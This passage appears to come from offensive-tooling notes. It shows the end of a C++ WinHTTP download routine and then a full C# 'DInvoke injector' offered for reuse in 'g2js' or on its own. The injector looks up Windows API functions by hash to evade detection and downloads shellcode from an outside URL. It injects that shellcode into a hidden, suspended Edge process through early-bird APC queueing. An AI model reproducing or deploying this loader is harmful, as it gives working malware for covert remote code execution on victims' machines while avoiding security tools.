        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0);

    // receive response
    WinHttpReceiveResponse(
        hRequest,
        NULL);

    // read the data
    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;

    do {

        BYTE temp[4096]{};
        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);

        if (bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }

    } while (bytesRead > 0);

    // close all the handles
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}
```


## 



## Xuh stuff

FROM XUH C# dinvoke injector code that you can use in g2js, or just on its own :
```
using DInvoke.Data;
using DInvoke.DynamicInvoke;
using System;
using System.Net;
using System.Runtime.InteropServices;

namespace TestAssembly
{
public class Program
{

[UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]

public delegate bool CreateProcessWDelegate(
string applicationName,
string commandLine,
IntPtr processAttributes,
IntPtr threadAttributes,
bool inheritHandles,
CREATION_FLAGS creationFlags,
IntPtr environment,
string currentDirectory,
ref STARTUPINFO startupInfo,
out PROCESS_INFORMATION processInformation);

[UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]

public delegate bool CloseHandleDelegate(IntPtr hObject);

[UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]

public delegate uint QueueUserAPCDelegate(IntPtr pfnAPC, // Pointer to the APC function
IntPtr hThread, // Handle to the thread

IntPtr dwData // Data to be passed to the APC function

);

[UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet =

CharSet.Unicode, SetLastError = true)]

public delegate uint ResumeThreadDelegate(

IntPtr hThread // Handle to the thread

);

[UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet =

CharSet.Unicode, SetLastError = true)]

public delegate IntPtr VirtualAllocExDelegate(

IntPtr hProcess,

IntPtr lpAddress,

uint dwSize,

uint flAllocationType,

uint flProtect);

[UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet =

CharSet.Unicode, SetLastError = true)]

public delegate bool VirtualProtectExDelegate(

IntPtr hProcess,

IntPtr lpAddress,

uint dwSize,

uint flNewProtect,

out uint lpflOldProtect);

[UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet =

CharSet.Unicode, SetLastError = true)]

public delegate bool WriteProcessMemoryDelegate(

IntPtr hProcess,

IntPtr lpBaseAddress,

byte[] lpBuffer,

uint nSize,

out IntPtr lpNumberOfBytesWritten);

[Flags]

public enum ALLOCATION_TYPE : uint

{

MEM_COMMIT = 0x1000,

MEM_RESERVE = 0x2000,

MEM_DECOMMIT = 0x4000,

MEM_RELEASE = 0x8000,

MEM_RESET = 0x80000,

MEM_PHYSICAL = 0x400000,

MEM_TOP_DOWN = 0x100000,

MEM_WRITE_WATCH = 0x200000,

MEM_LARGE_PAGES = 0x20000000

}

[Flags]

public enum MEMORY_PROTECTION : uint

{

PAGE_NOACCESS = 0x01,

PAGE_READONLY = 0x02,

PAGE_READWRITE = 0x04,

PAGE_WRITECOPY = 0x08,

PAGE_EXECUTE = 0x10,

PAGE_EXECUTE_READ = 0x20,

PAGE_EXECUTE_READWRITE = 0x40,

PAGE_EXECUTE_WRITECOPY = 0x80,

PAGE_GUARD = 0x100,

PAGE_NOCACHE = 0x200,

PAGE_WRITECOMBINE = 0x400

}

[Flags]

public enum CREATION_FLAGS : uint

{

DEBUG_PROCESS = 0x00000001,

DEBUG_ONLY_THIS_PROCESS = 0x00000002,

CREATE_SUSPENDED = 0x00000004,

DETACHED_PROCESS = 0x00000008,

CREATE_NEW_CONSOLE = 0x00000010,

NORMAL_PRIORITY_CLASS = 0x00000020,

IDLE_PRIORITY_CLASS = 0x00000040,

HIGH_PRIORITY_CLASS = 0x00000080,

REALTIME_PRIORITY_CLASS = 0x00000100,

CREATE_NEW_PROCESS_GROUP = 0x00000200,

CREATE_UNICODE_ENVIRONMENT = 0x00000400,

CREATE_SEPARATE_WOW_VDM = 0x00000800,

CREATE_SHARED_WOW_VDM = 0x00001000,

CREATE_FORCEDOS = 0x00002000,

BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,

ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,

INHERIT_PARENT_AFFINITY = 0x00010000,

INHERIT_CALLER_PRIORITY = 0x00020000,

CREATE_PROTECTED_PROCESS = 0x00040000,

EXTENDED_STARTUPINFO_PRESENT = 0x00080000,

PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,

PROCESS_MODE_BACKGROUND_END = 0x00200000,

CREATE_SECURE_PROCESS = 0x00400000,

CREATE_BREAKAWAY_FROM_JOB = 0x01000000,

CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,

CREATE_DEFAULT_ERROR_MODE = 0x04000000,

CREATE_NO_WINDOW = 0x08000000,

PROFILE_USER = 0x10000000,

PROFILE_KERNEL = 0x20000000,

PROFILE_SERVER = 0x40000000,

CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000,

}

[StructLayout(LayoutKind.Sequential)]

public struct STARTUPINFO

{

public int cb;

public IntPtr lpReserved;

public IntPtr lpDesktop;

public IntPtr lpTitle;

public int dwX;

public int dwY;

public int dwXSize;

public int dwYSize;

public int dwXCountChars;

public int dwYCountChars;

public int dwFillAttribute;

public int dwFlags;

public short wShowWindow;

public short cbReserved2;

public IntPtr lpReserved2;

public IntPtr hStdInput;

public IntPtr hStdOutput;

public IntPtr hStdError;

}

[StructLayout(LayoutKind.Sequential)]

public struct PROCESS_INFORMATION

{

public IntPtr hProcess;

public IntPtr hThread;

public int dwProcessId;

public int dwThreadId;

}

public Program()

{

byte[] shellcode;

// hashes n shit

uint checksum = 0xdeadc0de;

var hk32 = Generic.GetLoadedModuleAddress("2F9A6973C69A1D8B3A51AB6A6D918AA8", checksum);

var hCreateProcessW = Generic.GetExportAddress(hk32, "3D00AEB506FFD6D851CC51760FA39FD4", checksum);

var hVallocEx = Generic.GetExportAddress(hk32, "F92B8426C2366E31B524B3B585F97E99", checksum);

var hWriteProcessMemory = Generic.GetExportAddress(hk32, "1CD3F65BFB5E450D8543FE7B977B6C64", checksum);

var hVirtualProtectEx = Generic.GetExportAddress(hk32, "0DF7A8E87D5CAEF515A030C2812ECFD3", checksum);

var hResumeThread = Generic.GetExportAddress(hk32, "B539F6FB3A23C8109C6A886019B8D622", checksum);

var hQueueUserAPC = Generic.GetExportAddress(hk32, "07D51485672E94A9B53FD02E19677BBF", checksum);

var hCloseHandle = Generic.GetExportAddress(hk32, "99EE8FED21A16F8E8C66CD2097879D79", checksum);

using (var client = new WebClient())

{

// make proxy aware

client.Proxy = WebRequest.GetSystemWebProxy();

client.UseDefaultCredentials = true;

// set allowed tls versions

ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls13;

shellcode = client.DownloadData("https://www.infinity-bank.com/c");

};

var startup = new STARTUPINFO { dwFlags = 0x00000001 };

var processInfo = new PROCESS_INFORMATION();

startup.cb = Marshal.SizeOf(startup);

object boxedProcessInfo = processInfo;

object[] createProcessWParams =

{

@"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",

@"""C:\Program Files\(x86)\Microsoft\Edge\Application\msedge.exe --no-startup-window --win-session-start /prefetch:5""",

IntPtr.Zero,

IntPtr.Zero,

false,

CREATION_FLAGS.CREATE_NO_WINDOW | CREATION_FLAGS.CREATE_SUSPENDED,

IntPtr.Zero,

@"C:\Program Files (x86)\Microsoft\Edge\Application",

startup,

boxedProcessInfo

};

Generic.DynamicFunctionInvoke(

hCreateProcessW,

typeof(CreateProcessWDelegate),

ref createProcessWParams

);

processInfo = (PROCESS_INFORMATION)createProcessWParams[9];

object[] vallocExParams =

{

processInfo.hProcess,

IntPtr.Zero,

(uint)shellcode.Length,

(uint)ALLOCATION_TYPE.MEM_COMMIT|(uint)ALLOCATION_TYPE.MEM_RESERVE,

(uint)MEMORY_PROTECTION.PAGE_READWRITE

};

var baseAddress = (IntPtr)Generic.DynamicFunctionInvoke(

hVallocEx,

typeof(VirtualAllocExDelegate),

ref vallocExParams

);

object[] wpmParameters =

{

processInfo.hProcess,

baseAddress,

shellcode,

(uint)shellcode.Length,

IntPtr.Zero

};

Generic.DynamicFunctionInvoke(

hWriteProcessMemory,

typeof(WriteProcessMemoryDelegate),

ref wpmParameters

);

object[] vpExParameters =

{

processInfo.hProcess,

baseAddress,

(uint)shellcode.Length,

(uint)MEMORY_PROTECTION.PAGE_EXECUTE_READ,

0u

};

Generic.DynamicFunctionInvoke(

hVirtualProtectEx,

typeof(VirtualProtectExDelegate),

ref vpExParameters

);

object[] qapcParameters =

{

baseAddress,

processInfo.hThread,

IntPtr.Zero

};

Generic.DynamicFunctionInvoke(

hQueueUserAPC,

typeof(QueueUserAPCDelegate),

ref qapcParameters

);

object[] rthdParameters =

{

processInfo.hThread

};

Generic.DynamicFunctionInvoke(

hResumeThread,

typeof(ResumeThreadDelegate),

ref rthdParameters

);

object[] closeParameters =

{

processInfo.hProcess

};

Generic.DynamicFunctionInvoke(

hCloseHandle,

typeof(CloseHandleDelegate),

ref rthdParameters

);

Generic.DynamicFunctionInvoke(

hCloseHandle,

typeof(CloseHandleDelegate),

ref closeParameters

);

}

}

}
```